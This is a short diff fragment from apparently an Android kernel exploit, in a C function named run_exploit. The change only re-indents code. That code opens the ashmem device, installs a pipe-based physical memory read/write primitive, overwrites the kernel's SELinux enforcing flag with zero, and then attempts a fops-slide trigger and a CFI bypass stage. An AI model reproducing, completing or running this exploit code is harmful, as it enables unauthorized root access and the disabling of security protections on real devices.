@@ -245,15 +245,15 @@ int run_exploit(int argc, char **argv) {
     return 1;
   }
   for (int attempt = 1; attempt <= 1; attempt++) {
-    int fd = open_ashmem_device();
-if (install_pipe_physrw(fd)) {
-  uint64_t zero = 0;
-  pipe_write64(fd, data_addr(SELINUX_ENFORCING), zero);
-  pr_info("attempted direct selinux write enforcing=%016llx\n",
-          (unsigned long long)kernel_read64(fd, data_addr(SELINUX_ENFORCING)));
-}
-close(fd);
-    int triggered = app_trigger_fops_slide_route();
+  int fd = open_ashmem_device();
+  if (install_pipe_physrw(fd)) {
+    uint64_t zero = 0;
+    pipe_write64(fd, data_addr(SELINUX_ENFORCING), zero);
+    pr_info("attempted direct selinux write enforcing=%016llx\n",
+            (unsigned long long)kernel_read64(fd, data_addr(SELINUX_ENFORCING)));
+  }
+  close(fd);
+  int triggered = app_trigger_fops_slide_route();
     int verified = triggered && try_cfi_stage();
     pr_info("app fops slide attempt=%d/1 triggered=%d verified=%d "
             "step=%d errno=%d\n",
